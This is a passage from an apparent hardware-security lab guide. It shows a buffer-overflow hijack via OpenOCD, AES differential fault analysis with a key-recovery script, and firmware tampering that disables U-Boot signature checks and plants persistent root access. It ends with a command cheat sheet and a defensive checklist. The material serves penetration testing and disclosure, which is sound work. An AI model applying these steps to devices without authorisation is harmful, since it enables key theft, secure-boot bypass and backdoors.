0x20007FF0: 0x20008000 0x00000042 0x41414141 0x41414141
```

The stack shows the overwritten return address 0x41414141 (ASCII 'AAAA'), confirming the buffer overflow successfully corrupted the intended stack frame. Continue execution to observe control flow hijacking:

```bash
> resume
Info : halted: PC: 0x41414141
```

The processor attempted to execute code at address 0x41414141, demonstrating successful control flow hijacking. Replace the placeholder address with the actual address of your shellcode—pre-positioned in a predictable memory location—and verify that the exploit grants shell access or executes arbitrary commands.

For cryptographic fault attacks, target implementations of AES, RSA, or ECC that lack software-based fault detection. Differential Fault Analysis (DFA) exploits the relationship between correct and faulted cryptographic outputs to recover secret keys. Inject a single-bit fault during AES encryption's final round by glitching the power supply precisely when the SubBytes operation executes. Capture both the correct ciphertext (without glitch) and the faulted ciphertext (with glitch):

```bash
# Without glitch
echo "plaintext" | nc target_device 8080 > correct_output.bin

# With glitch (trigger glitch circuit at T+150ms)
echo "plaintext" | nc target_device 8080 > faulted_output.bin
```

Analyze the correct and faulted ciphertext pairs using a DFA tool such as the Phoenix AES DFA framework:

```python
from phoenixAES import phoenixAES

correct = open('correct_output.bin', 'rb').read()
faulted = open('faulted_output.bin', 'rb').read()

key = phoenixAES.crack_aes_key(correct, faulted)
print(f"Recovered AES key: {key.hex()}")
```

The DFA algorithm exploits the algebraic structure of AES to reverse-engineer the round key from the observed fault propagation. Successful key recovery requires multiple fault/correct pairs—typically 50-200 samples depending on fault precision and algorithm internals.

Firmware modification and reboot verification closes the exploit lifecycle. Extract the original firmware image using methods from Exercise 2, modify the binary to include a backdoor or privilege escalation hook, and reflash the modified image to the target device. For U-Boot bootloaders, inject a startup script that disables signature verification:

```bash
binwalk -e firmware_dump.bin
cd _firmware_dump.extracted/

# Locate U-Boot environment partition
grep -a "bootcmd=" uboot_env.bin

# Modify bootcmd to skip signature checks
echo "bootcmd=nand read 0x80000000 0x200000 0x800000; go 0x80000000" > new_bootcmd.txt
mkenvimage -s 0x20000 -o uboot_env_modified.bin new_bootcmd.txt
```

Reassemble the modified firmware image by replacing the original environment partition with `uboot_env_modified.bin` at the correct offset. Write the modified firmware back to flash using `flashrom`:

```bash
dd if=uboot_env_modified.bin of=firmware_dump.bin bs=1 seek=$((0x1C0000)) conv=notrunc
flashrom -p ft2232_spi:type=232H,port=A --write firmware_dump.bin
```

Power-cycle the target device and monitor the UART console. If the modification succeeded, the bootloader executes the altered boot command, bypassing signature verification and booting the unsigned kernel. Verify persistent access by setting a root password in the extracted filesystem and confirming that the modified password survives reflashing and reboot.

Document the complete exploit chain from initial reconnaissance through final verification. Capture oscilloscope traces of glitch waveforms, annotate logic analyzer captures with fault injection timings, and correlate UART console output with debugger register states. This comprehensive documentation serves as proof-of-concept evidence that theoretical vulnerabilities translate into exploitable hardware-level attacks, suitable for responsible disclosure to device manufacturers or presentation at security conferences.

## Hardware Security Checklist & Diagnostic Cheat Sheet

This reference section consolidates critical procedures, command sequences, and diagnostic techniques into a rapid-access format for field operations and time-constrained assessments. Use these condensed workflows to systematically evaluate target devices, prioritizing high-impact interfaces and common misconfigurations before escalating to advanced fault injection or reverse engineering.

### Initial Reconnaissance Workflow

1. **Visual PCB Inspection**: Photograph all board layers at 5MP minimum resolution. Identify processor (largest BGA/QFP), flash memory (8-pin SOIC near processor), voltage regulators (inductors + capacitors), and test points (unpopulated headers, labeled vias).

2. **Power Characterization**: Measure supply voltage at multiple test points with a multimeter. Verify 3.3V and 5V rails. Observe current draw at idle (typical <100mA for microcontroller-based devices) and during boot transients (may spike 2-5×).

3. **UART Discovery**: Probe suspected serial pads with a logic analyzer in continuous capture mode. Power-cycle the target and scan for characteristic UART idle-high states and start-bit transitions. Test standard baud rates: 115200, 57600, 38400, 19200, 9600.

4. **JTAG/SWD Enumeration**: Attempt OpenOCD connection with common target configurations (`target/stm32f4x.cfg`, `target/esp32.cfg`, `target/imx6.cfg`). If enumeration fails, try SWD transport as an alternative to JTAG.

### Sigrok Logic Analyzer Commands

**UART Capture with Protocol Decode**:
```bash
sigrok-cli --driver fx2lafw --samples 10M --channels 0=TX,1=RX \
  --protocol-decoders uart:baudrate=115200:parity=none \
  --protocol-decoder-annotations uart=tx-data --output-format ascii
```

**SPI Flash Transaction Monitoring**:
```bash
sigrok-cli --driver fx2lafw --samples 50M \
  --channels CS=0,SCK=1,MOSI=2,MISO=3 \
  --protocol-decoders spi:cs_polarity=active-low \
  --protocol-decoder-annotations spi=mosi-data,miso-data
```

**I²C Bus Scan and Decode**:
```bash
sigrok-cli --driver fx2lafw --samples 20M --channels SDA=0,SCL=1 \
  --protocol-decoders i2c --protocol-decoder-annotations i2c=data-read,data-write
```

### Flashrom Operations

**Detect Connected Flash Chip**:
```bash
flashrom -p ft2232_spi:type=232H,port=A
```

**Read Complete Flash to File**:
```bash
flashrom -p ft2232_spi:type=232H,port=A --read firmware_backup.bin
```

**Write Modified Firmware**:
```bash
flashrom -p ft2232_spi:type=232H,port=A --write modified_firmware.bin --verify
```

**Erase Entire Flash**:
```bash
flashrom -p ft2232_spi:type=232H,port=A --erase
```

### OpenOCD Debug Commands

**Launch OpenOCD with J-Link and STM32F4 Target**:
```bash
openocd -f interface/jlink.cfg -f target/stm32f4x.cfg
```

**Telnet Control Session** (in separate terminal):
```bash
telnet localhost 4444
```

**Essential OpenOCD Commands**:
- `reset halt`: Reset target and immediately halt execution
- `resume`: Continue execution after halt
- `step`: Execute one instruction
- `reg`: Display all registers
- `reg pc sp lr`: Display specific registers
- `mdw 0x20000000 64`: Memory display word (32-bit) at address, 64 words
- `mdb 0x08000000 256`: Memory display byte at address, 256 bytes
- `mww 0x40020014 0xFF`: Memory write word to address
- `bp 0x08001234 4 hw`: Set hardware breakpoint at address
- `rbp 0x08001234`: Remove breakpoint at address
- `wp 0x20007FFC 4 r`: Set read watchpoint on 4-byte region
- `dump_image file.bin 0x08000000 0x10000`: Dump memory region to file
- `flash write_image erase new_firmware.bin 0x08000000`: Flash programming

### Binwalk Firmware Analysis

**Extract Embedded Filesystems**:
```bash
binwalk -e firmware_dump.bin
```

**Entropy Analysis** (identify encrypted/compressed regions):
```bash
binwalk -E firmware_dump.bin
```

**Search for Specific Signatures**:
```bash
binwalk --signature --term firmware_dump.bin
```

### I²C Tools

**Scan Bus for Devices**:
```bash
i2cdetect -y 1
```

**Dump All Registers from Device**:
```bash
i2cdump -y 1 0x50
```

**Read Single Register**:
```bash
i2cget -y 1 0x68 0x00
```

**Write to Register**:
```bash
i2cset -y 1 0x50 0x00 0xFF
```

### GDB Remote Debugging

**Connect to OpenOCD GDB Server**:
```bash
gdb-multiarch firmware.elf
(gdb) target extended-remote localhost:3333
(gdb) monitor reset halt
(gdb) load
(gdb) continue
```

**Essential GDB Commands**:
- `break *0x08001234`: Set breakpoint at address
- `x/16xw 0x20000000`: Examine 16 words at address in hex
- `info registers`: Display all registers
- `disassemble $pc,+32`: Disassemble 32 bytes from program counter
- `set *0x20007FFC = 0x41414141`: Write value to memory address

### Common Hardware Attack Surfaces

- **UART Console**: Interactive shell, bootloader access, kernel messages revealing internal architecture
- **JTAG/SWD**: Full memory access, register inspection, real-time debugging
- **SPI Flash**: Firmware extraction, modification, persistent backdoor installation
- **I²C Bus**: Sensor spoofing, EEPROM modification, RTC manipulation
- **GPIO**: Physical actuator control, LED indicators revealing cryptographic state
- **Power Rails**: Voltage glitching, brown-out induction, side-channel analysis substrate

### Security Configuration Verification

1. **Debug Interface Lockdown**: Verify that JTAG/SWD access requires authentication or is permanently disabled through fuse bits.
2. **Secure Boot Validation**: Confirm cryptographic signature verification on boot, test resistance to voltage/clock glitching.
3. **Flash Protection**: Check write-protect pins, software-based sector locking, and read-out protection bits.
4. **Credential Storage**: Ensure no hardcoded passwords in firmware, unique per-device keys rather than shared factory defaults.
5. **Network Services**: Disable unnecessary services on UART/Ethernet, implement authentication on all management interfaces.

### Field Notes Template

For each target device, record:

- **Device Identification**: Manufacturer, model, FCC ID, PCB revision
- **Processor**: Part number, architecture, clock speed, flash/RAM capacity
- **Flash Memory**: Type (internal/external), capacity, interface (SPI/parallel)
- **Test Points Located**: UART pinout, JTAG/SWD pinout, SPI flash connections
- **Observed Behavior**: Boot messages, available shells, authentication requirements
- **Extracted Artifacts**: Firmware dumps, memory snapshots, cryptographic keys
- **Vulnerabilities Identified**: Accessible debug interfaces, default credentials, exploitable services
- **Recommended Mitigations**: Hardware modifications, firmware patches, configuration changes

This checklist condenses the laboratory exercises into actionable procedures suitable for rapid security assessments, penetration testing engagements, and hardware reverse engineering projects. Return to the detailed exercise sections for comprehensive explanations of underlying theory, failure modes, and advanced techniques beyond these fundamental workflows.
